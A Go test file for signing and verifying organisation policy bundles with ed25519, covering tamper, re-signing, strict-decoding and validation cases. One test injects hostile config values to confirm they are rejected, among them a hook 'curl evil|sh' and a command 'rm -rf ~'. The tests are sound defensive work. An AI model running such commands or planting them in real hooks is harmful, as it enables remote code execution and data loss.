package hubproto

import (
	"crypto/ed25519"
	"encoding/base64"
	"encoding/json"
	"errors"
	"strings"
	"testing"
	"time"
)

func samplePolicy() Policy {
	on := true
	return Policy{
		Org: "sushi", Version: 3, IssuedAt: time.Date(2026, 11, 10, 9, 30, 0, 123000000, time.FixedZone("CET", 3600)),
		Settings: Settings{
			ReviewProviders:           []string{"claude-session", "coderabbit-watch"},
			BudgetDailyWeightedTokens: 5_000_000,
			MergeQueueEnabled:         &on,
			MaxConcurrencyHint:        4,
			AcceptKinds:               []Kind{KindDepAdvisory},
			EscalateAfter:             2,
		},
	}
}

func signedPolicy(t *testing.T) (Policy, map[string]ed25519.PublicKey, ed25519.PrivateKey) {
	t.Helper()
	pub, priv := mustKey(t)
	kid := KeyIDFor(pub)
	p, err := SignPolicy(priv, kid, samplePolicy())
	if err != nil {
		t.Fatal(err)
	}
	return p, map[string]ed25519.PublicKey{kid: pub}, priv
}

func TestPolicyRoundTrip(t *testing.T) {
	p, trusted, _ := signedPolicy(t)
	if err := VerifyPolicy(p, trusted); err != nil {
		t.Fatal(err)
	}
	b, err := json.Marshal(p)
	if err != nil {
		t.Fatal(err)
	}
	got, err := DecodeAndVerifyPolicy(b, trusted)
	if err != nil {
		t.Fatalf("after JSON round trip: %v", err)
	}
	if got.Version != 3 || got.Org != "sushi" || !got.IssuedAt.Equal(p.IssuedAt) {
		t.Fatalf("%+v", got)
	}
}

func TestPolicyTamper(t *testing.T) {
	p, trusted, _ := signedPolicy(t)
	other, otherPriv := mustKey(t)
	cases := []struct {
		name string
		mut  func(*Policy)
		trus map[string]ed25519.PublicKey
		want error
	}{
		{"version bumped", func(p *Policy) { p.Version++ }, trusted, ErrPolicySignature},
		{"org changed", func(p *Policy) { p.Org = "other" }, trusted, ErrPolicySignature},
		{"issued_at moved", func(p *Policy) { p.IssuedAt = p.IssuedAt.Add(time.Second) }, trusted, ErrPolicySignature},
		{"budget raised", func(p *Policy) { p.Settings.BudgetDailyWeightedTokens *= 10 }, trusted, ErrPolicySignature},
		{"kinds widened", func(p *Policy) { p.Settings.AcceptKinds = AllKinds() }, trusted, ErrPolicySignature},
		{"merge queue unset", func(p *Policy) { p.Settings.MergeQueueEnabled = nil }, trusted, ErrPolicySignature},
		{"signature flipped", func(p *Policy) {
			b := []byte(p.Signature)
			if b[0] == 'A' {
				b[0] = 'B'
			} else {
				b[0] = 'A'
			}
			p.Signature = string(b)
		}, trusted, ErrPolicySignature},
		{"signature missing", func(p *Policy) { p.Signature = "" }, trusted, ErrPolicySignature},
		{"signature garbage", func(p *Policy) { p.Signature = "!!" }, trusted, ErrPolicySignature},
		{"unknown key id", func(p *Policy) { p.KeyID = "kother" }, trusted, ErrUntrustedKey},
		{"hub re-signs with own key", func(p *Policy) {
			q, err := SignPolicy(otherPriv, KeyIDFor(other), *p)
			if err != nil {
				t.Fatal(err)
			}
			*p = q
		}, trusted, ErrUntrustedKey},
		{"hub re-signs under trusted id", func(p *Policy) {
			kid := p.KeyID
			q, err := SignPolicy(otherPriv, kid, *p)
			if err != nil {
				t.Fatal(err)
			}
			*p = q
		}, trusted, ErrPolicySignature},
		{"no trusted keys", func(*Policy) {}, nil, errPolicyNoTrustSet},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			q := p
			s := p.Settings
			s.AcceptKinds = append([]Kind(nil), p.Settings.AcceptKinds...)
			q.Settings = s
			c.mut(&q)
			if err := VerifyPolicy(q, c.trus); !errors.Is(err, c.want) {
				t.Fatalf("got %v want %v", err, c.want)
			}
		})
	}
}

func TestPolicyUnknownKeysRejected(t *testing.T) {
	p, trusted, _ := signedPolicy(t)
	b, _ := json.Marshal(p)
	for name, inject := range map[string][2]string{
		"post_create in settings":  {`"settings":{`, `"settings":{"post_create":["curl evil|sh"],`},
		"dev_commands in settings": {`"settings":{`, `"settings":{"dev_commands":["rm -rf ~"],`},
		"sandbox image":            {`"settings":{`, `"settings":{"sandbox_image":"evil:latest",`},
		"top-level extra":          {`"org":`, `"command":"id","org":`},
		"settings case variant":    {`"settings":{`, `"settings":{"Post_Create":"x",`},
	} {
		t.Run(name, func(t *testing.T) {
			s := strings.Replace(string(b), inject[0], inject[1], 1)
			if s == string(b) {
				t.Fatal("injection did not apply")
			}
			if _, err := DecodeAndVerifyPolicy([]byte(s), trusted); !errors.Is(err, ErrPolicyMalformed) {
				t.Fatalf("got %v", err)
			}
		})
	}
	// Strict decoding also refuses trailing data and an oversized bundle.
	if _, err := DecodePolicy(append(b, []byte(`{}`)...)); err == nil {
		t.Fatal("trailing data accepted")
	}
	if _, err := DecodePolicy(make([]byte, MaxBody+1)); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("oversized: %v", err)
	}
}

func TestSettingsValidate(t *testing.T) {
	cases := map[string]Settings{
		"custom-cli not settable": {ReviewProviders: []string{"custom-cli"}},
		"unknown provider":        {ReviewProviders: []string{"evil-session"}},
		"dup provider":            {ReviewProviders: []string{"claude-session", "claude-session"}},
		"negative budget":         {BudgetDailyWeightedTokens: -1},
		"huge budget":             {BudgetDailyWeightedTokens: MaxPolicyBudget + 1},
		"concurrency":             {MaxConcurrencyHint: MaxPolicyConcurrency + 1},
		"negative concurrency":    {MaxConcurrencyHint: -1},
		"unknown kind":            {AcceptKinds: []Kind{"shell"}},
		"dup kind":                {AcceptKinds: []Kind{KindRedBumpPR, KindRedBumpPR}},
		"escalate":                {EscalateAfter: MaxPolicyEscalateAfter + 1},
	}
	for name, s := range cases {
		if s.Validate() == nil {
			t.Errorf("%s accepted", name)
		}
		_, priv := mustKey(t)
		p := samplePolicy()
		p.Settings = s
		if _, err := SignPolicy(priv, "k1", p); err == nil {
			t.Errorf("%s: signed an invalid policy", name)
		}
	}
	if (Settings{}).Validate() != nil {
		t.Fatal("empty settings refused")
	}
}

func TestSignPolicyHeaderChecks(t *testing.T) {
	_, priv := mustKey(t)
	for name, mut := range map[string]func(*Policy){
		"bad org":      func(p *Policy) { p.Org = "Sushi Org" },
		"zero version": func(p *Policy) { p.Version = 0 },
		"no time":      func(p *Policy) { p.IssuedAt = time.Time{} },
	} {
		p := samplePolicy()
		mut(&p)
		if _, err := SignPolicy(priv, "k1", p); err == nil {
			t.Errorf("%s signed", name)
		}
	}
	if _, err := SignPolicy(priv, "bad key id!", samplePolicy()); err == nil {
		t.Error("bad key id signed")
	}
}

func TestPolicySignatureDomainSeparated(t *testing.T) {
	// A request signature over the canonical policy JSON must not verify as a
	// policy signature: the domain prefix differs.
	pub, priv := mustKey(t)
	kid := KeyIDFor(pub)
	p := samplePolicy()
	p.KeyID = kid
	msg, _ := CanonicalPolicyBytes(p)
	raw := ed25519.Sign(priv, msg[len(policyDomain):])
	p.Signature = base64.RawURLEncoding.EncodeToString(raw)
	if VerifyPolicy(p, map[string]ed25519.PublicKey{kid: pub}) == nil {
		t.Fatal("verified")
	}
}

func TestTrustedKeys(t *testing.T) {
	pub, _ := mustKey(t)
	entry := FormatTrustedKey("admin-1", pub)
	m, err := ParseTrustedKeys([]string{entry})
	if err != nil || len(m) != 1 || !m["admin-1"].Equal(pub) {
		t.Fatalf("%v %v", m, err)
	}
	for name, entries := range map[string][]string{
		"no colon":  {"admin-1"},
		"bad id":    {"admin 1:" + EncodePublicKey(pub)},
		"bad key":   {"admin-1:abc"},
		"duplicate": {entry, entry},
	} {
		if _, err := ParseTrustedKeys(entries); err == nil {
			t.Errorf("%s accepted", name)
		}
	}
	if !strings.HasPrefix(KeyIDFor(pub), "k") || !ValidKeyID(KeyIDFor(pub)) {
		t.Fatal("KeyIDFor")
	}
}
